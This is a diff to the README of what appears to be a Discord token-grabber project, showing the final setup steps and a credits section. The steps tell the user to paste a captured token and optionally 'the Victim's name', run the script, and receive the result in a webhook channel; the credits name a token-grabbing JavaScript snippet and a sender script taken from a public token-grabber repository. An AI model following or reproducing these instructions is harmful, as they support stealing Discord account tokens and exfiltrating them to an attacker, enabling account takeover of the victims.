@@ -11,6 +11,12 @@
 8. Paste the token that you copied in the 2nd line
 
 **OPTIONAL** Paste the Victim's name in the 3rd line where it says to
+
 **OPTIONAL** Replace ping = False in the 4th line if you want to get pinged when the message is sent
 9. Click the Run button on the topbar
 You should have received a message in that channel of the webhook
+
+# Credits
+Scripts edited by Exotic Pineapple
+grabber.javascript was orignally from https://www.folkstalk.com/2022/09/get-discord-token-from-console-with-code-examples.html
+sender.py was originally from https://github.com/wodxgod/Discord-Token-Grabber
